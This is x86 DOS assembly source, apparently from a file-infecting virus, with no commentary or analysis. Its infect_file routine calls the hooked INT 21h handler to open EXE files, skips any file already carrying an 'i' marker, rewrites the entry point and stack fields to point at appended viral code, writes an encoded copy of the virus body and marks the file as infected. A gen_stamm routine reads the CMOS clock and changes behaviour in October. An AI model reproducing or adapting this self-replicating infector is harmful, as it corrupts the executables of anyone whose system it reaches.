
call21:         pushf
                call    cs:old_21
                ret

infect_file:    call    disable_sh
                mov     CS:rest_sh_state.b0, 0C3H

                pusha
                push    ds es
                cld

;                mov     si, dx
;                cld
;@@0:            mov     ah, al
;                lodsb
;                or      al, al
;                jnz     @@0
;                cmp     ah, '_'
;                jne     @@exit

                mov     ax, 3D00h
                call    call21
                jc      @@exit

                xchg    bx, ax

                mov     ah, 3Fh
                mve     ds, cs
                lea     dx, header
                mov     cx, size exe_struc
                call    call21
                cmp     ax, cx
                jne     @@close

                mov     ax, header.exe_mz
                cmp     ax, 'ZM'
                je      @@mz
                cmp     ax, 'MZ'
                jne     @@close

@@mz:           cmp     header.exe_checksum.b0, 'i'
                je      @@close

                mov     ax, 4200h
                xor     cx, cx
                mov     dx, header.exe_headersize
                shl     dx, 4
                call    call21

                mov     ah, 3Fh
                lea     dx, tempword1
                mov     cx, 2
                call    call21
                cmp     ax, cx
                jne     @@close

                mov     ax, 1234h
lastword        tempword1
                inc     ax
                jz      @@close

                push    bx
                mov     ax, 1220h
                int     2Fh
                mov     bl, es:[di]
                mov     ax, 1216h
                int     2Fh
                pop     bx

                mov     dx, es:[di].sft_size.h
                mov     ax, es:[di].sft_size.l
                or      al, al
                jz      @@exit
                mov     cx, 1000
                div     cx
                or      dx, dx
                jz      @@exit

                mov     es:[di].sft_openmode, 2

                mve     es, cs

                mov     ax, header.exe_num512
                dec     ax
                mov     cx, 512
                mul     cx
                add     ax, header.exe_last512
                adc     dx, 0
                mov     si, ax
                mov     di, dx

                mov     ax, 4202h
                cwd
                xor     cx, cx
                call    call21

                cmp     ax, si
                jne     @@close
                cmp     dx, di
                jne     @@close

                add     ax, 15
                adc     dx, 0
                and     al, not 15

                sub     si, ax
                sub     header.exe_last512, si

                push    ax
                push    dx

                shr     ax, 4
                shl     dx, 12
                or      ax, dx
                sub     ax, header.exe_headersize
                sub     ax, 16

                mov     cx, ax
                xchg    cx, header.exe_cs
                mov     save_cs, cx

                lea     cx, exe_start
                xchg    cx, header.exe_ip
                mov     save_ip, cx

                mov     cx, ax
                xchg    cx, header.exe_ss
                mov     save_ss, cx

                lea     cx, exe_endofstack
                xchg    cx, header.exe_sp
                mov     save_sp, cx

                add     header.exe_minmem, exe_memory

                add     header.exe_num512,  v_size / 512
                add     header.exe_last512, v_size mod 512

                mov     header.exe_checksum.b0, 'i'

                mov     ax, 4200h
                pop     cx
                pop     dx
                call    call21

                call    gen_stamm

                mov     ah, 40h
                lea     dx, start
                mov     cx, decr_size
                call    call21

                lea     si, real_code

@@1:            lea     di, buf
                mov     cx, 8

@@2:            lodsb
                xchg    dx, ax

                mov     bp, 8

@@3:            xor     ax, ax
                shl     dl, 1
                rcl     ax, 1
                dec     ax
                stosb

                dec     bp
                jnz     @@3

                loop    @@2

                mov     ah, 40h
                lea     dx, buf
                mov     cx, 64
                call    call21

                cmp     si, offset real_code + vir_size + stamms_max_ip
                jb      @@1

                mov     ax, 4200h
                cwd
                xor     cx, cx
                call    call21

                mov     ah, 40h
                lea     dx, header
                mov     cx, size exe_struc
                call    call21

@@close:        mov     ah, 3Eh
                call    call21

@@exit:         pop     es ds
                popa

                mov     CS:rest_sh_state.b0, 90H
                call    rest_sh_state

                ret

gen_stamm:      lea     di, stamm
                mov     al, 0C3h   ; RET
                stosb
                mov     cx, stamms_max_ip - 1
                xor     ax, ax
                rep     stosb

                mov     sux, 0D0F6h      ; not al

                mov     al, 8    ; month
                out     70h, al
                in      al, 71h
                cmp     al, 10   ; october ?
                jne     @@exit

                mov     sux, 00B0h      ; mov al, 0

                mov     ax, stamms_num
                call    rnd
                xchg    si, ax
                imul    si, (2+1+2+4)*2
                add     si, offset stamm_1

                mov     cx, 2

@@1:            lodsw
                xchg    di, ax
                add     di, offset stamm
                movsb
                lodsw
                xchg    di, ax
                add     di, offset stamm
                movsd

                loop    @@1

@@exit:         ret
